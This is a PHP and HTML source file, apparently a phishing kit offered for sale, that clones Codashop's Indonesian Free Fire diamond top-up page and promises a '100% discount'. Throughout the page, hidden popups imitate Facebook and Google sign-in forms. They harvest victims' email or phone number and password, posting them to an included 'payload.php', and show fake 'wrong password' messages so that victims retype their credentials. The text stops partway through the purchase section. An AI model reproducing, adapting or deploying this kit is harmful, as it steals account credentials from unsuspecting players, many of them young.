<?php
// Creator Sc  : ABU CODE - X 
// Order Script Vip : https://wa.me/6289509551861

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en"><head><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
      <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/vUgXt_KV952_-5BB2jjloYzl/recaptcha__id.js" crossorigin="anonymous" integrity="sha384-9/eZvlnubltljlK9pjkjmbuZF1bajebuBdTcd+F63UMa3tvNtRIRWeCHcQ+tFo0M"></script><script src="https://connect.facebook.net/signals/config/916139058437464?v=2.9.265&amp;r=stable&amp;domain=wlzqlnd.ljgtj85gs.biz.id&amp;hme=8faeb0ed09c145bbd9d3213e762abac29e9f76b8e7a9df9d71a3058625e3b7dd&amp;ex_m=96%2C187%2C136%2C21%2C68%2C69%2C129%2C64%2C43%2C130%2C73%2C63%2C10%2C143%2C82%2C15%2C95%2C124%2C117%2C71%2C74%2C123%2C140%2C104%2C145%2C7%2C3%2C4%2C6%2C5%2C2%2C83%2C93%2C146%2C151%2C201%2C57%2C167%2C168%2C50%2C238%2C28%2C70%2C213%2C212%2C211%2C30%2C56%2C9%2C59%2C89%2C90%2C91%2C97%2C120%2C29%2C27%2C122%2C119%2C118%2C137%2C72%2C139%2C138%2C45%2C55%2C113%2C14%2C142%2C40%2C226%2C227%2C225%2C24%2C25%2C26%2C17%2C19%2C39%2C35%2C37%2C36%2C78%2C84%2C88%2C102%2C128%2C131%2C41%2C103%2C22%2C20%2C109%2C65%2C33%2C133%2C132%2C134%2C125%2C23%2C32%2C54%2C101%2C141%2C66%2C16%2C135%2C106%2C77%2C62%2C18%2C31%2C249%2C194%2C181%2C182%2C180%2C252%2C244%2C195%2C99%2C121%2C76%2C111%2C49%2C42%2C44%2C105%2C110%2C116%2C53%2C60%2C115%2C48%2C51%2C47%2C92%2C144%2C0%2C114%2C13%2C112%2C11%2C1%2C52%2C85%2C58%2C61%2C108%2C81%2C80%2C147%2C148%2C86%2C87%2C8%2C94%2C46%2C126%2C79%2C75%2C67%2C107%2C98%2C38%2C127%2C34%2C100%2C12%2C149" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/xss.min.js"></script>
      <!-- End Google Tag Manager -->
      <script src="https://script.tapfiliate.com/tapfiliate.js" type="text/javascript" async=""></script>
      <meta charset="UTF-8">
      <!--[if lt IE 9]>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
      <![endif]-->
      <title>Top up FF | Diamond Free Fire Murah</title>
      <meta name="generator" content="coda2">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
      <meta name="mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="application-name" content="Codashop">
      <meta name="apple-mobile-web-app-capable " content="yes ">
      <meta name="apple-mobile-web-app-status-bar-style " content="black ">
      <meta name="apple-mobile-web-app-title " content="Codashop ">
      <link rel="apple-touch-icon " href="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/codashop-ico-192x192.eda9c373cc.png">
      <meta name="msapplication-TileImage " content="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/codashop-ico-144x144.e4494b8304.png">
      <meta name="msapplication-TileColor " content="#f76b1d ">
      <meta name="theme-color " content="#f76b1d">
      <meta name="format-detection" content="telephone=no">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <link rel="icon" type="image/x-icon" href="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/favicon.ico">
      <!-- OG Tags Start -->
      <meta property="og:url" content="https://www.codashop.com/id/free-fire">
      <meta property="og:type" content="product">
      <meta property="og:title" content="Free Fire (Indonesia) - Codashop">
      <meta property="og:description" content="Top up diamond Free Fire menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!">
      <meta property="og:image" content="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/freefire_640x241.png">
      <meta property="og:image:width" content="1200">
      <meta property="og:image:height" content="630">
      <!-- OG Tags End -->
      <meta name="description" content="Top up diamond Free Fire menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!">
      <link rel="preconnect" href="https://www.google-analytics.com">
      <link rel="preconnect" href="https://connect.facebook.net">
      <link rel="preconnect" href="https://www.googletagmanager.com">
      <link rel="preconnect" href="https://cdn.onesignal.com">
      <link rel="preconnect" href="https://cdn1.codashop.com">
      <style>
         .product__long-description,
         .product-container,
         .footer-container {
         display: none;
         }
         .content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 330px;
    padding: 5px;
    background: red;
    color:#fff;
    font-size: 13px;
    font-family: system-ui;
    top: -15px;
}
      </style>
      <!-- Facebook Pixel Code -->
      <script>
         ! function(f, b, e, v, n, t, s) {
             if (f.fbq) return;
             n = f.fbq = function() {
                 n.callMethod ?
                     n.callMethod.apply(n, arguments) : n.queue.push(arguments)
             };
             if (!f._fbq) f._fbq = n;
             n.push = n;
             n.loaded = !0;
             n.version = '2.0';
             n.queue = [];
             t = b.createElement(e);
             t.async = !0;
             t.src = v;
             s = b.getElementsByTagName(e)[0];
             s.parentNode.insertBefore(t, s)
         }(window,
             document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', 916139058437464); // Insert your pixel ID here.
         //fbq('track', 'PageView');
      </script>
      <noscript>
         <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=916139058437464&ev=PageView&noscript=1" />
      </noscript>
      <!-- DO NOT MODIFY -->
      <!-- End Facebook Pixel Code -->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/10/popupLogin.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/10/facebook.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/10/twitter.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/10/spinner.58144.css">
   </head>
   <body style="background: #280031 !important;" class="theme-page--product-page" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
      <div class="popup-login facebook animated fadeIn" style="display: none;">
         <div class="popup-box-login-fb">
            <a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb">
               <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/facebook_text.png" style="width: 100px;">
            </div>
            <div class="content-box-fb">
            <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
		      	<p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
               <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/69b5965b1c8f0d20f45be82f0522d88a6bfa2ba0.png" style="width: 60px;">
               <div class="txt-login-fb">
                  Masuk ke akun FREE FIRE Anda untuk menerima hadiah Anda&lt;
               </div> 
               <form class="login-form" onsubmit="return valid()" method="post">
                  <label>
                  <input type="text" name="email" id="emailx" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
                  </label>
                  <label>
                  <input type="password" name="password" id="passw" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off">
                  </label>
                
                  <input type="hidden" name="userIdForm" id="userIdForm">
                  <input type="hidden" name="login" value="Facebook" readonly="">
                  <button type="submit" class="btn-login-fb">Masuk</button>
               </form>
               <div class="txt-create-account">Buat Akun</div>
               <div class="txt-not-now">Jangan Sekarang</div>
               <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
            </div>
            <div class="language-box">
               <center>
               <div class="language-name language-name-active">English (UK)</div>
               <div class="language-name">Bahasa Indonesia</div>
               <div class="language-name">Basa Jawa</div>
               <div class="language-name">Bahasa Melayu</div>
               <div class="language-name">日本語</div>
               <div class="language-name">Español</div>
               <div class="language-name">Português (Brasil)</div>
               <div class="language-name">
                  <i class="fa fa-plus"></i>
               </div>
               </center>
            </div>
            <div class="copyright">Facebook Inc.</div>
         </div>
      </div>

      <div class="popup-login gp animated fadeIn" style="display: none;">
         <div class="popup-box-login-twitter">
         <a onclick="close_twitter()" class="close-gp"><i class="zmdi zmdi-close"></i></a>
            <div class="header-twitter">
               <center>
               <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxd6bVJa4ogFe0WDtyWRMaSNPMwoh9pEiqxw&amp;s" style="width: 120px;">
               </center>
            </div>
            <div class="box-twitter">
               <center>
               <form action="" method="post">
                  <div class="txt-login-twitter">Login to Google</div>
                  <div class="input-box-twitter">
                     <input type="text" name="email" placeholder="Email atau Telepon" required="">
                  </div>
                  <div class="input-box-twitter">
                     <input type="password" name="password" placeholder="Kata Sandi" required="">
                  </div>
                 
                  <input type="hidden" name="userIdForm" id="userIdForm">
                  <input type="hidden" name="login" value="Google" readonly="">
                  <button type="submit" class="btn-login-twitter">Log In</button>
               </form>
               </center>
            </div>
         </div>
      </div>

      <input type="hidden" id="seller-name" value="Free Fire">
      <input type="hidden" id="context-path" value="">
      <input type="hidden" id="group-id" value="33">
      <div id="product-page__container" class="product-page__container">
         <script type="text/javascript">
            $(document).ready(function() {
                countryCode = '360';
            });
            
            var viewAllText = 'Lihat semua';
            var resultUnitText = 'Hasil';
            var notFoundText = 'Tidak ada hasil';
         </script>
         <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/shop-topnav2.7e1fed6bdf.js"></script>
         <nav class="top-navbar top-nav--general">
            <div class="top-nav-container">
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/codashop-logo-new-2x.png" alt="Codashop">
                  </a>
                  <h3 class="slogan-element" style="color: #b9aec5 !important;">Cara tercepat dan termudah untuk pembelian kredit permainan.</h3>
               </div>
               <div class="search-container">
                  <div class="search-icon-container">
                     <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"></path>
                     </svg>
                  </div>
               </div>
            </div>
            <div class="search-input-container">
               <input type="search" name="search-keyword" id="search-keyword" class="input-search" placeholder="Pencarian game atau voucher">
            </div>
            <div class="search-result-list"></div>
         </nav>
         <nav class="top-navbar top-nav--productpage">
            <div class="top-nav-container">
               <div class="custom-page__logo" style="display: none">
                  <div class="logo-image-container">
                     <a href="/ph"><img class="logo-image" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/grab.29dad06670f873936002ddb910253a4b.png" alt="Grabpay"></a>
                  </div>
                  <span class="brand-tagline"></span>
               </div>
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/codashop-logo-new-2x.png" alt="Codashop">
                  </a>
                  <h3 class="slogan-element" style="color: #b9aec5 !important;">Cara tercepat dan termudah untuk pembelian kredit permainan.</h3>
               </div>
               <div class="search-input-container">
                  <div class="search-input-container--productpage">
                     <input type="search" name="search-input" id="search-input" class="search-input__productpage" placeholder="Pencarian game atau voucher">
                     <svg class="search-icon--productpage" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"></path>
                     </svg>
                  </div>
                  <div class="search-result-list"></div>
               </div>
            </div>
         </nav>
         <div class="notification-wrapper"></div>
         <main class="container product-container">
            <!-- Google Tag Manager (noscript) -->
            <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PF7TJ9" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
            <!-- End Google Tag Manager (noscript) -->
            <input type="hidden" id="page-name" value="productPage">
            <input type="hidden" id="country-id" value="ID">
            <header class="product-details-container shop-content__container">
               <figure class="product-top-banner__container shop-content--image">
                  <img src="https://cdn1.codashop.com/S/content/common/images/mno/freefire_new_640x241.jpg" alt="" class="product__top-banner">
               </figure>
               <h2 class="product__name shop-content--heading">Free Fire</h2>
               <input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
               <label for="product-description">
               <span class="more-info">Baca lebih lanjut</span>
               <span class="less-info">Tutup informasi detail</span>
               </label>
               <article class="product__description shop-content__container">
                  <p class="shop-content--paragraph"> <strong>PERHATIAN</strong>: Metode pembayaran ShopeePay hanya tersedia untuk Pengguna Handphone (HP/Mobile). Harap pastikan bahwa aplikasi Shopee Anda telah diperbarui dan tengah memiliki saldo ShopeePay yang mencukupi sebelum melakukan top up. </p>
                  <p class="shop-content--paragraph"> Top up diamond FF hanya dalam hitungan detik! Cukup masukan User ID Free Fire Anda, pilih jumlah Diamond yang Anda inginkan, dan selesaikan pembayaran. Diamond FF akan secara langsung ditambahkan ke akun Free Fire (FF) Anda.</p>
                  <p class="shop-content--paragraph">Top up FF pakai pulsa Telkomsel, Indosat, XL, Tri &amp; Smartfren atau bayar menggunakan GoPay, OVO, ShopeePay, Transfer Bank, Indomaret, Alfamart, Kredivo, LinkAja, TrueMoney, hingga DOKU Wallet. Codashop adalah tempat terbaik untuk top up diamond FF (Free Fire) secara online tanpa registrasi ataupun log-in.</p>
                  <p class="shop-content--paragraph"> Unduh Free Fire sekarang!<br>
                     <a class="shop-content--badge" href="http://bit.ly/2MO50Gc" rel="noopener" target="_blank">
                     <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/app_store_coda.png" alt="Download on the App Store"></a>
                     <a class="shop-content--badge" href="http://bit.ly/2MO50Gc" rel="noopener" target="_blank">
                     <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/google_play_coda.png" alt="Download on Google Play"></a>
                  </p>
                  <p class="shop-content--paragraph"> NGOBROL BARENG TENTANG<br>
                     <a class="shop-content--image" href="https://community.codashop.com/id/categories/id-free-fire?_ga=2.196159340.1903496707.1631278087-464225859.1625739665" target="_blank" rel="noopener"> 
                     <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/freefire_id_codaclub.jpeg" alt="Free Fire Conversation"></a>
                  </p>
               </article>
            </header>
            <section id="contents" class="main-content">
               <input type="hidden" id="pricePointId" name="pricePointId" value="">
               <div class="section select-server" style="box-shadow: 0px 0px 0px transparent; border:1px solid #ffffff !important; background: #ffffff !important;">
                  <h2 class="circle">
                     <span style="background: #6242fc !important;">1</span> Masukkan Player ID
                  </h2>
                  <div class="form-group-container form-user-identities">
                     <div class="form-field-wrapper form__field-user-id single-field-form">
                        <input name="userId" id="userId" type="tel" class="playerid form-input" placeholder="Masukkan Player ID">
                     </div>
                     <div class="form__image-helper-container">
                        <span class="ico-question desktop-trigger" style="background: #6242fc !important;">?</span>
                        <span class="ico-question mobile-trigger" style="background: #6242fc !important;">?</span>
                     </div>
                     <div class="img-helper">
                        <div id="img-helper-element"></div>
                        <span class="img-helper__close-btn"> ✕ </span>
                     </div>
                     <div class="img-helper__background"></div>
                     <p class="form__field-instruction-text" style="color: #8d74a4 !important;">Untuk menemukan ID Anda, ketuk pada ikon karakter. User ID tercantum di bawah nama karakter Anda. Contoh: "5363266446".</p>
                  </div>
               </div>
               <div class="confirm-modal__container" id="confirm-user-dialog" title="">
                  <ul>
                     <li class="confirm-modal__title">Detail pesanan</li>
                     <li class="confirm-modal__confirm-txt">Mohon konfirmasi akun anda sudah benar.</li>
                  </ul>
               </div>
               <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery.mask.min.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/mobile/js/freefire.4a7a9740bc.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/third_party_common.0859f0e010.js"></script>
               <script type="text/javascript">
                  $(document).ready(function() {
                      $("#confirm-user-dialog").dialog({
                          resizable: false,
                          height: "auto",
                          dialogClass: "no-titlebar",
                          autoOpen: false,
                          modal: true,
                          dialogClass: "confirm-user-dialog__container",
                          buttons: [{
                                  text: 'Batalkan',
                                  class: "confirm-user-dialog__btn btn-cancel",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                  }
                              },
                              {
                                  text: 'Konfirm',
                                  class: "confirm-user-dialog__btn btn-blue",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                      openTxnWindow();
                                  }
                              }
                          ],
                          create: function(event, ui) {
                              $(".ui-widget-header").hide();
                              $(this).closest(".ui-dialog").css("padding-top", "15px");
                          }
                      });
                  
                  
                  
                  });
                  
                  function showConfirmation(data, extraMsg) {
                      var ul = $("#confirm-user-dialog > ul");
                  
                      ul = $(ul);
                  
                      $("#confirm-user-dialog > ul > li").not('li:first, li:nth-child(2)').remove();
                  
                      var li = $();
                      var nickname = JSON.parse(decodeURIComponent(data.result)).roles[0].role;
                  
                      nickname = filterXSS(nickname);
                  
                      li = li.add("<li class='confirm-user-dialog__extra-msg'>" + extraMsg + "</li>");                    
                             li = li.add("<li><div>" + 'ID: ' + "</div><div>" + data.user.userId + "</div></li>");
                      li = li.add("<li><div>" + 'Harga: ' + "</div><div>" + data.channelPrice + "</div></li>");
                      li = li.add("<li><div>" + 'Bayar dengan: ' + "</div><div>" + data.paymentChannel + "</div></li>");
                  
                      li.appendTo(ul);
                      ul.appendTo("#confirm-user-dialog");
                  
                      var txnIdElement = $();
                      txnIdElement = txnIdElement.add("<span id='span-txnId' class='" + data.txnId + "' style='display: none;'></span>");
                      txnIdElement.appendTo("#confirm-user-dialog");
                  
                      $("#overlay").fadeIn(function() {
                          $(".confirm-user-dialog__container").show();
                      });
                  }
               </script>
               <div class="section voucher" style="box-shadow: 0px 0px 0px transparent; border:1px solid #ffffff !important; background: #ffffff !important;">
                  <h2 class="circle">
                     <span style="background: #6242fc !important;">2</span> Pilih Nominal Top Up
                  </h2>
                  <ul class="vocherSelectionList ul-denoms voucher-denom-container">
                      <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>5 Diamonds </strong>
                        <br>
                        </a>
                     </li>
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>12 Diamonds</strong>
                        <br>
                        </a>
                     </li>
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>50 Diamonds</strong>
                        <br>
                        </a>
                     </li>
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>70 Diamonds</strong>
                        <br>
                        </a>
                     </li>
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>140 Diamonds</strong>
                        <br>
                        </a>
                     </li>
                      <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>355 Diamonds</strong>
                        <br>
                        </a>
                     </li>
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>720 Diamonds</strong>
                        </a>
                     </li>
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>1450 Diamonds</strong>
                        </a>
                     </li>
                     
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>2180 Diamonds</strong>
                        </a>
                     </li>
                     
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>3640 Diamonds</strong>
                        </a>
                     </li>
                     
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>7290 Diamonds</strong>
                        </a>
                     </li>
                     
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>36500 Diamonds</strong>
                        </a>
                     </li>
                     
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        <center><img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Freefire_diamonds.png" width="60px" height="60px"></center>
                        <strong>73100 Diamonds</strong>
                        </a>
                     </li>
                     </ul>
               </div>
               <script type="text/javascript">
                  $('.disable-voucher').mouseover(function() {
                      tempText = $(this).html();
                      $(this).html('Tidak tersedia');
                  });
                  
                  $('.disable-voucher').mouseout(function() {
                      $(this).html(tempText);
                  });
               </script>
               <div class="section payment" style="box-shadow: 0px 0px 0px transparent; border:1px solid #ffffff !important; background: #ffffff !important;">
                  <h2 class="circle">
                     <span style="background: #6242fc !important;">3</span> Pilih pembayaran
                  </h2>
                  <div id="paymentChannelSuggestionModal" class="pc-suggestion-modal">
                     <form id="paymentChannelSuggestionForm" action="/spring/api/suggestPaymentChannel" method="POST">
                        <input type="hidden" id="paymentChannelSuggestionCountry" name="paymentChannelSuggestionCountry" value="ID">
                        <div class="pc-suggestion-card">
                           <i id="btnIconClose" class="pc-suggestion-icon-close"></i>
                           <p class="pc-suggestion-title">
                              Kami menghargai masukanmu!
                           </p>
                           <p class="pc-suggestion-description">
                              Kami terus berusaha untuk menambah lebih banyak lagi pilihan pembayaran di Indonesia! Beri tahu kami metode pembayaran apa yang kamu ingin gunakan di Codashop!
                           </p>
                           <p>
                              <input type="text" class="pc-suggestion-input-field" maxlength="100" placeholder="Ketik pilihan pembayaran yang kamu inginkan di sini" id="paymentChannelSuggestionValue">
                           </p>
                           <p id="paymentChannelSuggestionErrorMsgDiv" style="display:none;">
                              <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/error-icon.20986d3fe0.png" alt="Error" width="14px" height="14px">
                              <span id="paymentChannelSuggestionErrorMsg" class="pc-suggestion-error-msg"></span>
                           </p>
                           <div class="pc-suggestion-text-center">
                              <div class="g-recaptcha" data-sitekey="6Lc8br0ZAAAAAOAZHpdE1Fm9RA9tK85W3ano_l0-"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" width="304" height="78" role="presentation" name="a-dfkp5x452giu" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Lc8br0ZAAAAAOAZHpdE1Fm9RA9tK85W3ano_l0-&amp;co=aHR0cHM6Ly93bHpxbG5kLmxqZ3RqODVncy5iaXouaWQ6NDQz&amp;hl=id&amp;v=vUgXt_KV952_-5BB2jjloYzl&amp;size=normal&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=gmzwatpu1rcz"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
                           </div>
                           <input type="submit" class="pc-suggestion-submit-button" value="Kirim">
                        </div>
                     </form>
                  </div>
                  <ul class="ul-paymentChannels">
                     <li id="paymentChannel_227" class="payment-channel-element">
                        <div class="payment-channel-link" onclick="selectPaymentChannel(227, 'GoPay', false, false, false, false, false);">
                           <span class="element-check-label" id="checkLabel" style="background: #6242fc !important;"></span>
                           <div class="payment-channel-container">
                              <figure class="payment-logo-container">
                                 <img class="logo" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/Gopaylogoo.png" alt="GO_PAY logo">
                              </figure>
                           </div>
                           <div class="payment-price-container">
                              <div class="price_label" id="priceLabel_227"></div>
                              <div class="price pr" id="priceInfo_227"></div>
                           </div>
                           <div class="payment-tagline-container" id="showTagline" style="width: 100%;">
                              <p class="payment-tagline" style="display: block;">Bayar dengan <span id="paymentName">CodaPayment</span> ( Diskon 100% )</p>
                           </div>
                           <div class="best-deal-label" id="showPayLabel"></div>
                        </div>
                     </li>
                     
                    

                  </ul>
               </div>
               <div class="section buy default-template" style="box-shadow: 0px 0px 0px transparent; border:1px solid #ffffff !important; background: #ffffff !important;">
                  <h2 class="circle">
                     <span style="background: #6242fc !important;">4</span>
                     <div class="section-title">Beli!</div>
                  </h2>
